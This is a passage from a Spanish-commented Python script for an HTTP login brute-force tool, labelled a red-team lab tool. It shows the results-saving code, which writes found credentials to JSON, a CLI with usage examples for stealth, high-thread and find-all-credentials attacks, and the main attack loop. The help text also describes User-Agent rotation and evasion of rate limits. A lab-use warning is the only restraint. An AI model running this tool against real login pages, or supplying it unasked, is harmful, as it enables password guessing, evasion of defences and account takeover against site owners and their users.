        timestamp = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
        stats_file = output_dir / f"statistics_{timestamp}.json"
        
        self.statistics.end_time = datetime.now(timezone.utc)
        
        stats_data = self.statistics.to_dict()
        stats_data['found_credentials'] = [str(r.credential) for r in self.found_credentials]
        stats_data['total_found'] = len(self.found_credentials)
        
        try:
            with open(stats_file, 'w', encoding='utf-8') as f:
                json.dump(stats_data, f, indent=2, ensure_ascii=False)
            self.logger.info(f"Estadísticas guardadas: {stats_file}")
        except Exception as e:
            self.logger.error(f"Error guardando estadísticas: {e}")
        
        # Guardar todas las credenciales encontradas (resumen)
        if self.found_credentials:
            all_creds_file = output_dir / f"credentials_{timestamp}.json"
            
            try:
                with open(all_creds_file, 'w', encoding='utf-8') as f:
                    json.dump(
                        [r.to_dict() for r in self.found_credentials],
                        f,
                        indent=2,
                        ensure_ascii=False
                    )
                self.logger.info(f"Credenciales guardadas: {all_creds_file}")
            except Exception as e:
                self.logger.error(f"Error guardando credenciales: {e}")
    
    def cleanup(self):
        """Limpieza de recursos"""
        self.http_client.close()


# ============================================================================
# CLI INTERFACE
# ============================================================================

def create_arg_parser() -> argparse.ArgumentParser:
    """Crea el parser de argumentos CLI"""
    parser = argparse.ArgumentParser(
        description='HTTP Brute Force ~ Red Team Lab Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Ejemplos de uso:

  1. BÁSICO - Ataque secuencial:
     %(prog)s -u http://localhost/login users.txt passwords.txt

  2. RÁPIDO:
     %(prog)s -u http://localhost/login users.txt passwords.txt --threads 10

  3. MÁXIMA EFECTIVIDAD - Encuentra TODAS las credenciales:
     %(prog)s -u http://localhost/login users.txt passwords.txt --threads 20 --follow

  4. MODO STEALTH - Lento pero sigiloso:
     %(prog)s -u http://localhost/login users.txt passwords.txt --delay 3.0 --threads 1

  5. ALTA VELOCIDAD - Máximo rendimiento:
     %(prog)s -u http://localhost/login combos.txt --combo --threads 50 --delay 0.1

NOTAS:
  • Las credenciales se ordenan automáticamente por probabilidad
  • Los User-Agents rotan automáticamente
  • Detecta y ajusta automáticamente si hay rate limiting
  
ADVERTENCIA: Solo usar en entornos de laboratorio autorizados.
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='URL del formulario de login')
    parser.add_argument('file1', help='Archivo de usuarios o combos')
    parser.add_argument('file2', nargs='?', help='Archivo de passwords')
    parser.add_argument('--combo', action='store_true', help='file1 contiene combos user:pass')
    parser.add_argument('--threads', type=int, default=1, help='Threads concurrentes (default: 1)')
    parser.add_argument('--follow', action='store_true', help='Modo FOLLOW: busca TODAS las credenciales')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verbose')
    parser.add_argument('--log', type=Path, help='Archivo de log')
    parser.add_argument('--config', type=Path, help='Archivo de configuración JSON')
    parser.add_argument('--output-dir', type=Path, default=Path('./results'), help='Directorio de resultados')
    parser.add_argument('--delay', type=float, help='Delay base entre intentos')
    parser.add_argument('--timeout', type=int, help='Timeout en segundos')
    parser.add_argument('--no-verify-ssl', action='store_true', help='Deshabilitar verificación SSL')
    
    return parser


def main():
    """Función principal"""
    parser = create_arg_parser()
    args = parser.parse_args()
    
    # Cargar configuración
    config = load_config(args.config)
    
    # Overrides de CLI
    if args.delay is not None:
        config['delay_between_attempts'] = args.delay
    if args.timeout is not None:
        config['timeout'] = args.timeout
    if args.no_verify_ssl:
        config['verify_ssl'] = False
    
    # Setup logger
    log_level = LogLevel.DEBUG if args.verbose else LogLevel.INFO
    logger = setup_logger('BruteForceEnhanced', log_level, args.log)
    
    # Banner
    logger.info("=" * 70)
    logger.info(" HTTP BRUTE FORCE v3.0.0")
    logger.info(" Red Team Lab Tool - Solo para uso autorizado")
    logger.info("=" * 70)
    
    # Validar argumentos
    if not args.combo and not args.file2:
        logger.error("Modo estándar requiere dos archivos (users.txt passwords.txt)")
        sys.exit(1)
    
    # Crear engine
    engine = BruteForceEngine(config, logger)
    
    try:
        # Inicializar objetivo
        if not engine.initialize_target(args.url):
            logger.error("Fallo al inicializar objetivo")
            sys.exit(1)
        
        # Cargar y ordenar credenciales
        if args.combo:
            credentials = engine.credential_loader.load_combos(Path(args.file1))
        else:
            usernames = engine.credential_loader.load_from_file(Path(args.file1))
            passwords = engine.credential_loader.load_from_file(Path(args.file2))
            credentials = engine.credential_loader.generate_credentials(usernames, passwords)
        
        logger.info(f"Total de credenciales a probar: {len(credentials)}")
        
        # Ejecutar ataque
        if args.threads > 1:
            result = engine.run_attack_concurrent(credentials, args.threads, args.follow)
        else:
            result = engine.run_attack_sequential(credentials)
        
        # Guardar resultados
        engine.save_results(result, args.output_dir)
        
        # Resumen final
        logger.info("=" * 70)
        logger.info("RESUMEN DEL ATAQUE")
        logger.info("=" * 70)
        logger.info(f"Total intentos: {engine.statistics.total_attempts}")
        logger.info(f"Éxitos: {engine.statistics.successful_attempts}")
        logger.info(f"Fallos: {engine.statistics.failed_attempts}")
        logger.info(f"Errores: {engine.statistics.errors}")
        logger.info(f"Bloqueos detectados: {engine.statistics.blocked_attempts}")
        logger.info(f"Duración: {engine.statistics.get_duration():.2f}s")
        logger.info(f"Tasa: {engine.statistics.get_rate():.2f} intentos/seg")
        
        if engine.found_credentials:
            logger.info(f"[*] Total credenciales encontradas: {len(engine.found_credentials)}")
            for cred_result in engine.found_credentials:
                logger.info(f"   • {cred_result.credential}")
        
        logger.info("=" * 70)
        
        sys.exit(0 if result and result.success else 1)
        
    except KeyboardInterrupt:
        logger.warning("\n[!] Ataque interrumpido por el usuario")
        engine.save_results(None, args.output_dir)
        sys.exit(130)
        
    except Exception as e:
        logger.critical(f"Error fatal: {e}", exc_info=True)
        sys.exit(1)
        
    finally:
        engine.cleanup()


if __name__ == '__main__':
    main()
